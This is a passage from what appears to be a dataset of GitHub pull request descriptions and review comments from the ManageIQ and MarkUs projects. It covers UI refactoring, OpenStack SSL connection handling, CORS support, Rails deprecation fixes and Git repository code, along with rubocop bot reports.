I'm not sure if `ApplicationController::Feature` is the correct name for the class, but this is the technique we should be using.","[""Wow. This is great stuff. Thanks for tackling it. Even if it's only to demonstrate a way out, it's great to have code to look at.  :heart:"", 'I think we can use this data to eliminate the copy/pasted `set_active_elements` and `set_elements_and_redirect_unauthorized_user` too.', 'Alright.  `set_active_elements` has one implementation now.  I suspect we can do the same thing with `set_elements_and_redirect_unauthorized_user`, but I need to study that more.', ""Ya, I am very sure we can use this same data to dry up `set_elements_and_redirect_unauthorized_user`, but that should happen in a different PR.  I'd like to get this merged, so I'm looking for feedback! :)"", ""Looks like the build errored, not failed.  I'm closing and reopening to kick off a build."", '@tenderlove I like it.  What do you think?  @dclarizio @h-kataria @Fryguy ', ""Also I'm looking for suggestions on the name `ApplicationController::Feature`.  It's not a controller, so I'm not sure putting it under `ApplicationController` is a good idea.  Also, I'm not entirely clear on what to call this collection of data.  Is `Feature` right?  This data obviously has something in common.  What is it?"", ""It's like a ProductFeatureUIElements thing.  Based on a feature, this the accordion, tree, instance filter, image filter to use.  Naming is hard."", ""I like `UIElement`.  Maybe `UIElements::ProductFeature`?  I assume we have more UI elements we'll want to model."", '<rubocop />Checked commits https://github.com/tenderlove/manageiq/commit/99edab85f46c0d482ed6429a26425109a7e52e49 .. https://github.com/tenderlove/manageiq/commit/ae30ff9f5fd804817e6e356488febaa9fc9b6c50 with rubocop 0.27.1\n8 files checked, 2 offenses detected\n\n**vmdb/app/controllers/mixins/vm_show_mixin.rb**\n- [ ] :large_orange_diamond: - [Line 75](https://github.com/tenderlove/manageiq/blob/ae30ff9f5fd804817e6e356488febaa9fc9b6c50/vmdb/app/controllers/mixins/vm_show_mixin.rb#L75), Col 7 - [Style/AccessorMethodName](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/AccessorMethodName) - Do not prefix writer method names with `set_`.\n\n**vmdb/app/controllers/vm_cloud_controller.rb**\n- [ ] :small_blue_diamond: - [Line 12](https://github.com/tenderlove/manageiq/blob/ae30ff9f5fd804817e6e356488febaa9fc9b6c50/vmdb/app/controllers/vm_cloud_controller.rb#L12), Col 3 - [Metrics/MethodLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/MethodLength) - Method has too many lines. [30/25]\n', '@tenderlove\r\nThese are accordions with trees in them, so perhaps UIElements::AccordionTrees would be good? . . . yes, they are based on features that are checked by role_allows calls, but they are not specifically features.\r\n\r\nThis looks great, would love to start identifying more like this.  Thx, Dan', 'really cool :+1:', ""I like this a lot.  I'm fine with any name that is close...   Vmdb::UIElements::AccordionTree or something like that.\r\n\r\n:+1: "", '@tenderlove : This looks really great, but I am a bit concerned how this goes together with the `TreeBuilder` stuff.\r\n\r\nI mean, I was trying to exctract the tree and tree node building into a separate classes and it was done on many places almost except for these files and this area of vm/cloud/ifra.\r\n\r\nSo we have now 2 ways to move on and each is applied at a part of the controllers. I was thinking of doing the trees first and when having all the trees converting then wrapping them in something that would represent the accordions.\r\n\r\nAlso I would like to remove the redundancy I see in:\r\n```\r\n+        :role        => ""images_accord"",\r\n+        :name        => :images,\r\n+        :accord_name => ""images"",\r\n+        :tree_name   => :images_tree,\r\n+        :title       => ""Images by Provider"",\r\n+        :container   => ""images_tree_div""),\r\n```\r\n\r\nthe naming is almost regular, I know that I saw some irregularity I think it was in the Filter trees I mean I would like to keep only the `name` and skip the `accord_name`, `tree_name`.\r\n\r\nAlso all the trees that go throu the TreeBuilder already use a single partial for rendering the tree while the trees in vm/infra/cloud go through a set of slightly different partials. Unifying this (applying the TreeBuilder to the vm/infa/cloud) would allow to go through the single partial, remove the extra partials and unify the naming of name/accord_name/tree_name/container...\r\n\r\n', ""> This looks really great, but I am a bit concerned how this goes together with the TreeBuilder stuff.\r\n\r\nI guess we could integrate with the tree builder class.  From a quick glance, it seems the tree builder class knows what `@sb` is, and that worries me.  I'd like to insulate that from the rest of the system.  Maybe we can extract it?\r\n\r\nAlso it's not obvious to me how the two are related, but I think you know this code better than me.\r\n\r\n> Also I would like to remove the redundancy I see in:\r\n\r\nAgreed.  Fortunately we have methods on the UI elements, so those objects can be in charge of deriving that data."", 'I fully agree on `@sb`. I just was not able to get rid of it in one go so I started by passing it in.', '@tenderlove : maybe you could help me remove the @sb from the TreeBuilder. I need it there for 3 things:\r\n\r\n 1. Adding the trees to the @sb in `add_to_sandbox`. Maybe that could be moved outside of the TreeBuilder back to the controllers?\r\n 1. When building tree nodes I need to know the `my_server_id` and `my_zone` which is used to highlight the current zone and server in the tree.\r\n 1. Working with methods from the Sandbox mixin -- management of trees in the view state\r\n', '@tenderlove : on the redundancy. If I am seeing it right, the images_filter are the only two accordion/tree pair that do not respect the naming scheme between name, accord_name, tree_name so by renaming them to match the rest all over the other controllers we could remove 3 keys from your feature hash I believe.\r\n\r\nMaking it just:\r\n```\r\n      ApplicationController::Feature.new_with_hash(                                                 \r\n        :role => ""instances_filter_accord"",                                                  \r\n        :name => :filter,                                                                    \r\n        :title => ""Instances""),     \r\n```\r\n\r\nWe can merge your PR as it is and do that in a follow-up PR but I\'d really like to do this.', ""> Adding the trees to the @sb in add_to_sandbox. Maybe that could be moved outside of the TreeBuilder back to the controllers?\r\n\r\nYa I think we can do that.  My only concern is that we have many subclasses of the tree builder which means it'll be harder to find them all and push that functionality back to the controller.  I'll try it out and send a WIP pr.\r\n\r\n> When building tree nodes I need to know the my_server_id and my_zone which is used to highlight the current zone and server in the tree.\r\n\r\nI think we can just pass those in.  I'll look though.\r\n\r\n> Working with methods from the Sandbox mixin -- management of trees in the view state\r\n\r\nI'll look in to this as well.\r\n\r\n> on the redundancy. If I am seeing it right, the images_filter are the only two accordion/tree pair that do not respect the naming scheme between name, accord_name, tree_name so by renaming them to match the rest all over the other controllers we could remove 3 keys from your feature hash I believe.\r\n\r\nYa, that's what I saw too.  I'd like to rename them, but I don't know what all those names do, so I chose to keep it fully backwards compatible.  If you know how to fix it, do you want to fork this PR and send a new one with the fixes?"", ""I hope that the @sb usage would be mainly in the base class. I wanted to extract the tree-building into the subclasses -- have the code specific for building the particular tree in the subclass. Then I wanted to have other presentation details in the subclass -- the locals_for_render are the beginning of that idea.\r\n\r\nThen I was trying to extract code for building tree nodes into separate classes. Now I have an ugly class with a big case statement -- TreeNodeBuilder, but I hope it's only a start. It's not straightforward to put the nodes buiding responsibility under the TreeBuilder because one tree can contain nodes of several types and vice versa, same node types can live under different trees.\r\n\r\nAfter having the tree building extracted into it's own classes and having just a couple of partials for the rendering (now we have a bunch of partials that render particular trees and therefor the details of various trees are split between views and controller method's case statement branches) I was thinking about generalizing the accordions by creating an entity what would represent them. After having the accordions I would like to represent an explorer as an entity what would wrap several accordions and other behavior. So what you did -- a set of Features is sort of where I would like to get, but I was thinking about going from the partials up, removing partial views, generalizing them and getting up to the controllers.\r\n\r\nYou did it exactly the opposite from the controllers and did not touch the views.\r\n\r\nPlease, don't get me wrong I love the changes you did. I am just a bit concerned about having one part done partly in one way and other part partly done in another way so I would love to get some common understanding and agreement.\r\n\r\nI am trying to convert the trees in VM/Infra/Cloud and will be happy to cooperate with you on identifying patterns that we can apply over all the controllers.\r\n\r\nOn the @sb -- I wanted to have some clearly defined interface for the @sb that I see as a view state object. I started by extracting some methods into the Sandbox mixin."", 'Did not find any issues when testing in the UI.', 'Yay! :tada:  :heart: ']"
52,ManageIQ/manageiq,1732.0,Just some misc refactorings against application controller and widgets.,"['<pr_mergeability_checker />This pull request is not mergeable.  Please rebase and repush.', '@tenderlove : looks very nice, I mean the new code ;-), Can you look at the small nits that I commented above? I would then do UI testing of this PR. Thx!', '@tenderlove : will you be doing any changes here or shall I test this in the UI to get it merged?', '@martinpovolny yes, can you test please.  Thanks!', '<rubocop />Checked commits https://github.com/tenderlove/manageiq/commit/17297cbfd6cd6f32a4c42c6e9414e1e7b6338ca8 .. https://github.com/tenderlove/manageiq/commit/fb2b9f2610acfc63bc54efc91a28bc8867264008 with rubocop 0.27.1\n2 files checked, 3 offenses detected\n\n**vmdb/app/controllers/application_controller.rb**\n- [ ] :large_orange_diamond: - [Line 1019](https://github.com/tenderlove/manageiq/blob/fb2b9f2610acfc63bc54efc91a28bc8867264008/vmdb/app/controllers/application_controller.rb#L1019), Col 19 - [Style/PercentLiteralDelimiters](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/PercentLiteralDelimiters) - `%w`-literals should be delimited by `(` and `)`\n- [ ] :large_orange_diamond: - [Line 1020](https://github.com/tenderlove/manageiq/blob/fb2b9f2610acfc63bc54efc91a28bc8867264008/vmdb/app/controllers/application_controller.rb#L1020), Col 25 - [Style/SpaceInsideBrackets](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/SpaceInsideBrackets) - Space inside square brackets detected.\n- [ ] :large_orange_diamond: - [Line 1020](https://github.com/tenderlove/manageiq/blob/fb2b9f2610acfc63bc54efc91a28bc8867264008/vmdb/app/controllers/application_controller.rb#L1020), Col 41 - [Style/SpaceInsideBrackets](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/SpaceInsideBrackets) - Space inside square brackets detected.\n']"
53,ManageIQ/manageiq,2178.0,"All connections to OpenStack need to attempt to connect non-SSL then SSL.  There are two reasons for this:

1.  OpenStack doesn't have a set of ports designated for use with their API over SSL.  The ports are generally kept as the same number (i.e., Keystone is usually 5000 regardless of whether it is SSL protected).

2.  ManageIQ does not have a way to specify whether a Provider's endpoint is using SSL.  So, users cannot configure this for different providers.

The problem that was uncovered by this bug is that *most* connections were trying SSL.  However, connections made with an unscoped token used to retrieve the list of visible tenants was **not** trying SSL.

Additionally, this PR will allow OpenStack credential validation to altogether bypass trying to determine the user's default tenant name.

Fixes #2155
Fixes:
https://bugzilla.redhat.com/show_bug.cgi?id=1201920","['Linking the original talk discussion: http://talk.manageiq.org/t/ssl-failing-on-openstack-provider/595', 'This is essentially a work around for issues #2208 and #2209.', ""@blomquisg I'm fine with this after `try_connection_with_ssl` is renamed to not include `_with_ssl` and the minor comment about the `port.to_i`."", '<rubocop />Checked commits https://github.com/blomquisg/manageiq/commit/9de72f3cd399f1f6363c052defefc66198f4389d .. https://github.com/blomquisg/manageiq/commit/1de2abc084798c590ea0ce17957c347def2731a0 with rubocop 0.27.1\n4 files checked, 0 offenses detected\nEverything looks good. :cake:\n', 'Looks good @blomquisg :+1:   until we add use_ssl/verify_ssl_mode options.', 'I just noticed this, but if the column has a nil or a blank string as the port, then that will be passed to the method.  port.to_i will be 0.  This should be changed to deal with that.  We have the same problem with some of the other providers as well.', '@blomquisg opened #2243 to tackle the nil/empty string condition @Fryguy mentions. ', '`nil` is handled by the parameter default (5000).  But, I can see empty string causing problems.\r\n\r\nI handled that in the event handler code, but not here. ']"
54,ManageIQ/manageiq,2459.0,"Originally attempted to fix https://bugzilla.redhat.com/show_bug.cgi?id=1206729.
Added more validation related enhancements.","['cc @mzazrivec ', '<rubocop />Checked commits https://github.com/bzwei/manageiq/commit/0187b83e46cf2de081b3ced372679abef6e6e25e .. https://github.com/bzwei/manageiq/commit/0466114957445529ff5fc4deb5e3651a6a99e2d1 with rubocop 0.27.1\n5 files checked, 0 offenses detected\nEverything looks good. :star:\n', 'Verified fix.']"
55,ManageIQ/manageiq,2374.0,Adding keypair on Provider level. And using this keypair for all the hosts in the provider for ssh.,"[""Don't forget about the file upload field for the private key (can be done in a seperate PR). Thx!"", '@jrafanie CI weird failure http://paste.openstack.org/show/197514/, is it enough to capture the log output or you wanted something more?', ""@Ladas I have no idea, I don't see an error.  If there's an error, I typically, grab the failing test information, the PR number or master commit sha1 and the random seed used.  See https://github.com/ManageIQ/manageiq/issues/2317 as an example."", '@jrafanie hm the error here was that it just timeouted on something', '@Ladas I made some comments in the other PR before realizing it was based on this one.', '@Fryguy yes I saw them, I think we can continue here', '<pr_mergeability_checker />This pull request is not mergeable.  Please rebase and repush.', '@jrafanie could you check the CI output?', '@Ladas : job restarted', ""@martinpovolny Regarding using a file upload for the key - do you have any pointers as to how to accomplish that?  I'm running into difficulty as, per my understanding, we have to set the form encoding; however after checking the HTML source for the form, there is no form tag.\r\n\r\nI guess I'm a bit confused as to how the form is actually processed... ?"", ""@tzumainn @martinpovolny I think it's all via ajax, so you will need to do that using iframe on the background. But I would guess UI guys have already something usable there? Do you?\r\n\r\nI've seen uploads in import sections."", '<rubocop />Checked commits https://github.com/Ladas/manageiq/commit/a3bec0e80e31d6525109b5a2314326640af986ea .. https://github.com/Ladas/manageiq/commit/978cea75c14ca7ca5ce90365c5c6a9da29e7572e with rubocop 0.27.1\n9 files checked, 11 offenses detected\n\n**vmdb/app/controllers/ems_common.rb**\n- [ ] :small_blue_diamond: - [Line 619](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/controllers/ems_common.rb#L619), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [135/120]\n- [ ] :small_blue_diamond: - [Line 620](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/controllers/ems_common.rb#L620), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [134/120]\n- [ ] :small_blue_diamond: - [Line 710](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/controllers/ems_common.rb#L710), Col 121 - [Metrics/LineLength](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/LineLength) - Line is too long. [122/120]\n\n**vmdb/app/models/host.rb**\n- [ ] :large_orange_diamond: - [Line 1405](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/models/host.rb#L1405), Col 26 - [Style/SpaceAroundEqualsInParameterDefault](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/SpaceAroundEqualsInParameterDefault) - Surrounding space missing in default value assignment.\n- [ ] :small_blue_diamond: - [Line 1405](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/models/host.rb#L1405), Col 3 - [Metrics/AbcSize](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Metrics/AbcSize) - Assignment Branch Condition size for connect_ssh is too high. [24.54/15]\n\n**vmdb/app/models/host_openstack_infra.rb**\n- [ ] :large_orange_diamond: - [Line 4](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/models/host_openstack_infra.rb#L4), Col 25 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 16](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/models/host_openstack_infra.rb#L16), Col 12 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n\n**vmdb/app/models/mixins/authentication_mixin.rb**\n- [ ] :large_orange_diamond: - [Line 124](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/models/mixins/authentication_mixin.rb#L124), Col 79 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 126](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/models/mixins/authentication_mixin.rb#L126), Col 11 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 128](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/models/mixins/authentication_mixin.rb#L128), Col 18 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] :large_orange_diamond: - [Line 128](https://github.com/Ladas/manageiq/blob/978cea75c14ca7ca5ce90365c5c6a9da29e7572e/vmdb/app/models/mixins/authentication_mixin.rb#L128), Col 76 - [Style/RedundantSelf](http://rubydoc.info/gems/rubocop/0.27.1/RuboCop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n', '@h-kataria : can you, please, point @tzumainn to the file-upload ajax code that you mentioned on the call today, please?', '@tzumainn I know we spoke on IRC about this but I figured I\'d put it here as a point of reference.\r\n\r\nYou can find a few examples of a file-upload ""ajax"" type transaction in the following places:\r\n```miq_ae_customization_controller```, which handles the Automate -> Customization -> Import/Export accordion. Take a look at ```app/views/miq_ae_customization/_dialog_import_export.haml``` and the accompanying javascript ```app/assets/javascripts/dialog_import_export.js```.\r\n\r\n```miq_ae_tools_controller```, which handles Automate -> Import/Export. This similarly uses ```app/views/miq_ae_tools/_import_export.haml``` and the javascript ```app/assets/javascripts/automate_import_export.js```.\r\n\r\nFinally, the ```report_controller```, which handles Cloud Intelligence -> Reports -> Import/Export accordion, but only the widgets is currently being done in an ajax style. Again, take a look at ```app/views/report/_export_widgets.haml``` and the javascript ```app/assets/javascripts/widget_import_export.js```', ""@eclarizio Yep!  It was very helpful; I have a first pass at the UI at https://github.com/ManageIQ/manageiq/pull/2549.  There are some flaws with the patch, I'm hoping someone might be able to give me some feedback?""]"
56,ManageIQ/manageiq,2705.0,"- Using templates for cfme-external-auth and cfme-remote-user
- Leveraging *.conf file to be loaded upon apache start.
- Using templates for httpd-auth pam module.
- Removing external auth conf files when unconfiguring.
","['@kbrock please review.  template based, would maintain configuration for 5.4 to later.  Prereq for the BZ to fix external auth upgrade issue.', '@kbrock more simplification as discussed. Please review.', 'adding external_httpd_authentication#deactivate and calling it from appliance_console::cli would be great.\r\n\r\n```ruby\r\n    def deactivate\r\n      unconfigure_ipa\r\n      unconfigure_httpd\r\n    end\r\n```', '@kbrock as discussed. Tire kicking went well here.  ', '<rubocop />Checked commits https://github.com/abellotti/manageiq/commit/2163690c61c71204110715947572dd8e299c0766 .. https://github.com/abellotti/manageiq/commit/89fb5f0a5d1c904540823ec903b0e96c2185619b with rubocop 0.27.1\n4 files checked, 0 offenses detected\nEverything looks good. :cake:\n']"
57,ManageIQ/manageiq,2733.0,"These changes are remains of my edit that I did to fix an issue with Analysis profiles. Part is fixed by https://github.com/ManageIQ/manageiq/commit/f6782cc509ea32e288c96f12d45d695becc712d4
part turned out not to be a bug so this is just the cleanup that remained from my branch.","['@skateman : please, review\r\n', '@skateman : all ok now?', '@dclarizio: renamed the variable for clarity', '<rubocop />Checked commits https://github.com/martinpovolny/manageiq/commit/6dd0ac6dc2170b8638164cdf5e7a3d8080c1f435 .. https://github.com/martinpovolny/manageiq/commit/3c278f26a86006feb190982f233de5b4d843726e with rubocop 0.27.1\n0 files checked, 0 offenses detected\nEverything looks good. :cookie:\n', '@skateman, @himdel, @mzazrivec : guys, please, test, review; thx!', '@martinpovolny tested, looks good for me!']"
58,ManageIQ/manageiq,2806.0,"Bugfix OpenstackInfra check stack status before scale
OpenstackInfra check stack status before scale method and
exposing method for the automate usage.

Also UI check for update","['@blomquisg Please review', ""@jrafanie I've started task for refactoring, we will tackle in next sprints if that is ok. The rest is fixed"", '<rubocop />Checked commits https://github.com/Ladas/manageiq/commit/b3ee44ca7973622b1f6b21545ccef2897b463ed7 .. https://github.com/Ladas/manageiq/commit/6ffc56b2312be25cc1a6a0e0ad1bd585b329b60d with rubocop 0.27.1\n4 files checked, 0 offenses detected\nEverything looks good. :star:\n', '@blomquisg this is ready for final review']"
59,ManageIQ/manageiq,2717.0,"Destroy parent provider when destroying EmsOpenstackInfra, also
nullify relations to cloud. Until we have some management of
the Providers, this should be the way how it works.","['Can you add tests please?', '@tenderlove will do', '@tenderlove tests added for the whole process', '> Destroy parent provider when destroying EmsOpenstackInfra, also\r\n> nullify relations to cloud. Until we have some management of\r\n> the Providers, this should be the way how it works.\r\n\r\n@Ladas Can you explain why this behavior is changing?\r\n\r\nWhat problem did we have before?\r\nWhy should we remove the `ProviderOpenstack` when we destroy an `EmsOpenstackInfra`?\r\nWhy should we nullify the `EmsCloud` when we destroy the `ProviderOpenstack`?\r\n\r\nCan you comment on the workflow?  thanks.', ""@jrafanie The first version of workflow wasn't ideal, I needed some thinking time to design it properly. I think this should be it, until we have some management of Providers.  \r\n\r\nWhat problem did we have before?\r\n- on delete hook was missing, so QE discovered it leaves Porovider behind, there is no provider management now, so it all needs to go through EmsOpenstackInfra\r\n\r\nWhy should we remove the ProviderOpenstack when we destroy an EmsOpenstackInfra?\r\n- ProviderOpenstack is being created on EmsOpenstackInfra create, so it should be deleted the same way\r\n\r\nWhy should we nullify the EmsCloud when we destroy the ProviderOpenstack?\r\n- That relation needs to disappear when we delete provider, otherwise the foreign key will be pointing to non existent entity"", '<rubocop />Checked commits https://github.com/Ladas/manageiq/commit/8481bd32f2d53a1dd3a60e8004de4dc4e932eff2 .. https://github.com/Ladas/manageiq/commit/20f03b857e86eca6e4d08dda358f167c2f6e1081 with rubocop 0.27.1\n3 files checked, 0 offenses detected\nEverything looks good. :cookie:\n', ""> What problem did we have before?\r\n> \r\n> on delete hook was missing, so QE discovered it leaves Porovider behind, there is no provider management now, so it all needs to go through EmsOpenstackInfra\r\n> Why should we remove the ProviderOpenstack when we destroy an EmsOpenstackInfra?\r\n> \r\n> ProviderOpenstack is being created on EmsOpenstackInfra create, so it should be deleted the same way\r\n> Why should we nullify the EmsCloud when we destroy the ProviderOpenstack?\r\n> \r\n> That relation needs to disappear when we delete provider, otherwise the foreign key will be pointing to non existent entity\r\n\r\n@Ladas Ok, I don't really understand the workflow, it seems like the provider is just a placeholder connected to the ems since we don't have anything we can do at the provider level.  I think that makes sense.\r\n\r\nI'm hoping @blomquisg understands the context better than I do. :confused:  "", ""> Why should we remove the ProviderOpenstack when we destroy an EmsOpenstackInfra?\r\n> \r\n> * ProviderOpenstack is being created on EmsOpenstackInfra create, so it should be deleted the same way\r\n\r\nThe only question I have is about this part.  Does it make sense to keep the `ProviderOpenstack` around in case there's an `EmsOpenstack` (cloud) around that's still under it?  Or, is that not a valid state for `ProviderOpenstack`?  I.e., can an `EmsOpenstack` exist without a `ProviderOpenstack` and still make sense?"", '@blomquisg I think ProviderOpenstack should always have EmsOpenstackInfra. Yes, EmsOpenstack without ProviderOpenstack makes sense. And you can always make the association later.']"
60,ManageIQ/manageiq,2935.0,,"['<rubocop />Checked commit https://github.com/bzwei/manageiq/commit/36514958911d611ed9585b644f1b30e768377c29 with rubocop 0.27.1\n3 files checked, 0 offenses detected\nEverything looks good. :+1:\n']"
61,ManageIQ/manageiq,2605.0,"We want to be able to consume the API from a web browse.

To do so we need to support CORS. http://en.wikipedia.org/wiki/Cross-origin_resource_sharing

Here is a initial hack to make that work.

Clone an example from here: https://github.com/martinpovolny/manageiq-api-example","['@abellotti Please review.  @tenderlove Please review the routes change.', '@Fryguy : this is a wip I will do changes and ping when ready. + I will put a client example here.', ""@abellotti : I don't see in a foreseeable future time, that I would be able to put into this. So if you don't see any issue here I would like to merge it and do any further work in a separate PR."", '@abellotti Thoughts?  If you are ok with it as is, please merge', '@abellotti : removed the FIXME', '<rubocop />Checked commit https://github.com/martinpovolny/manageiq/commit/72cc56f855748bfdd7a4c2a90ff6cc68870774db with rubocop 0.27.1\n2 files checked, 0 offenses detected\nEverything looks good. :+1:\n']"
62,ManageIQ/manageiq,2979.0,"https://bugzilla.redhat.com/show_bug.cgi?id=1223835

The old code used `includes(:ext_management_system)` to help the fetching performance. It only works for models that have an association with `ExtManagementSystem`. `Storage` is such an exception. It turned out there are other models that do not have the association. 

This fix provides a general solution to first detect the existence of the association. It also tries two possible methods to get the zone.","['@bzwei Would be good to add tests for the models we know are processed by this method.  Refactoring the new `target +=` logic into a separate method should make it easier to test than trying to test the `entire evaluate_hourly_timer` method.', ""Yeah, I need to see specs.  In particular, I don't think you need the case for zone_name since it's an alias of my_zone, but I could be wrong.\r\n\r\nIf the goal is to have models describe their instances' zones, I feel like it seems better to have a method on all of the models we care about and just call that."", '@Fryguy While looking into an enhancement a couple months ago I noticed that a few models defined zone_name method only and mentioned it to @bzwei when we were discussing this issue.  Searching for it again it looks like those models (CimComputerSystem, CimStorageExtent, SniaFileShare and SniaLocalFileSystem) are not currently processed here.', 'I added spec test. I did not remove `zone_name` method thinking of it does not hurt and we may need to add those models.', '@bzwei I was discussing this issue more with @Fryguy and we were thinking it would be a better idea to delegate the selection of the zone instances to each model that is alert-able instead of trying to handle the different cases here using conditional logic.  We would need to add a class method like `in_zone(zone)` to Cluster/Deployment Role, Datastore, Host/Node, Provider, Server and Vm.', ""The solution with the latest commit is to utilize existing accessors in Zone class. The behaviors are a little different. The old code finds all instances of a model whose `ext_management_system` is in the zone, plus those don't have an `ext_management_system` assigned. The new code excludes instances that don't have an `ext_management_system` assigned. After some discussions we think this change is appropriate. "", '@bzwei It seems we do need to retain the old logic of including resources not directly associated with a zone through a provider.  There are a number of alerts that could be configured that do not require the provider relationship.  For example setting up a custom expression to check snapshot count, tagging events or even if the provider is still valid.\r\n\r\nUltimately it would make more sense to have an hourly timer run for these disconnected resources and allow to current runs to focus on the resources in their zone.  This would also remove the duplication we have today since each zone is processing the disconnected resources.\r\n\r\n@bzwei @Fryguy thoughts?', ""With this latest commit, I added a boolean flag to Zone's accessors to include disconnected resources. We can investigate later if we need to have a dedicated timer for disconnected resources only."", 'LGTM.  @Fryguy Anything else here?', '<rubocop />Checked commit https://github.com/bzwei/manageiq/commit/787a7f08233b0741b039068996bbba4f16f40ae0 with rubocop 0.27.1\n3 files checked, 0 offenses detected\nEverything looks good. :+1:\n']"
63,ManageIQ/manageiq,3145.0,"#### Build relations instead of using finder options.

    fixes warning: Relation#calculate with finder options is deprecated. Please build a scope and then call calculate on it instead.

#### Use Relation#to_a instead of #all when we want an array

    Fixes warning: Relation#all is deprecated. If you want to eager-load a relation, you can call #load (e.g. `Post.where(published: true).load`). If you want to get an array of records fro

####  Use existing timestamp behavior of allowing nulls (t.timestamp, t.timestamps)

    Fixes warning:
    `#timestamp` was called without specifying an option for `null`.
    In Rails 5, this behavior will change to `null: false`.
    You should manually specify `null: true` to prevent the behavior of your existing migrations from changing.
","[""cc @matthewd @tenderlove (note I couldn't get all of the timestamp warnings... see test output... :confused:)\r\n\r\nI need your help/guidance how to fix the next noisy warning in these specs.\r\n\r\nWe use sanitize_sql_for_conditions with options and table name in the migrations... I believe we have to use the migration stub model to build relations, not sure if you have thoughts... :pray:   See [here](\r\nhttps://github.com/jrafanie/manageiq/blob/75b4a9bac77699a55656aed1abd22877d11282ef/vmdb/lib/migration_helper.rb#L112), we call this all over this file.\r\n\r\nIf you want to work on these :wink:, you can see the warnings by running `bundle exec rake test:migrations:setup && bundle exec rake test:migrations` from vmdb."", ""I'll fix the rubocop warning..."", 'All fixed now', '@jrafanie This looks great - thanks', 'Fixed the uneeded to_a @Fryguy found.\r\n\r\nAdded issue to the bot to help us remember the change in the migration code for timestamps from null:true to null:false [here](https://github.com/ManageIQ/miq_bot/issues/69)\r\n\r\nAnything else?', 'I was gonna list them all, but there were way more than I expected :smile: ', 'Ok, @matthewd @Fryguy all done... please review... ', '<rubocop />Checked commits https://github.com/jrafanie/manageiq/commit/a757836ad8ac6c8a8184f22917306892294c777b .. https://github.com/jrafanie/manageiq/commit/59599d581d566173bc728407a2bdbc5c51580089 with rubocop 0.27.1\n54 files checked, 0 offenses detected\nEverything looks good. :cookie:\n', ':+1: I will merge it.']"
64,ManageIQ/manageiq,3156.0,they have been deprecated in rails 4.0,"[':+1:', 'removing ""ci processing spec"" - this is unrelated and should not be in this pr', 'Updated that orchestration relationship\r\n\r\nthanks for help all', '<rubocop />Checked commit https://github.com/kbrock/manageiq/commit/99cc1f4cade975234f5758351b724a588ebbefba with rubocop 0.27.1\n8 files checked, 0 offenses detected\nEverything looks good. :cookie:\n']"
65,MarkUsProject/Markus,1892.0,"Removed references to populate_repo_browser in controller, tests and routes config; copied submissions_controller.rb to lib/benchmarking/submission_files/ to update it.",[]
66,MarkUsProject/Markus,1894.0,"- All web interface manipulations (upload, replace, delete, download) with Git repos are functional.
- Cleaned some code up (refactoring and thinking about future master + git merge)
- Failing rake tests will be addressed.",[]
67,MarkUsProject/Markus,1907.0,"Wrote tests for get_current_assignment method in Assignment model

Test cases:
* when all assignments are due in more than 3 days --> returns the assignment that is due first
* when all assignments are past the due date --> returns the assignment that was due most recently
* when there is an assignment due in 3 days --> returns the assignment due in 3 days
* when the next assignment is due in more than 3 days --> returns the assignment that was most recently due
* when no assignments are found --> returns nil
* when one assignment is found --> returns the only assignment
","['@ifung There still a failing test in MainController, but it should be easy to fix!']"
68,MarkUsProject/Markus,1910.0,"* Change all `find_all_by_...` to `where(...)`, `find_or_create_by_` to `find_or_create_by`, `find_last_by_` to `where(...).last`

* Remove code that is commented out

* Update TODO",[]
69,MarkUsProject/Markus,1913.0,Update code related to Relation#all which has been removed from rails 4.1,[]
70,MarkUsProject/Markus,1930.0,"- Reverted some changes that were made inside of the non-git portions of code to fix the compounded path issue
- Fixed the issue at the source, the path parameter of RevisionFile objects in SVN was set to just the path excluding the file name, whereas Git methods we previously built assuming the path parameter included the entire path (with the file name). 
- After correcting the way that the path is stored within the RevisionFile objects, the method ""stringify"" had to be rewrote because it previously relied on a full path provided within the RevisionFile objects to do a lookup within the repos for objects.
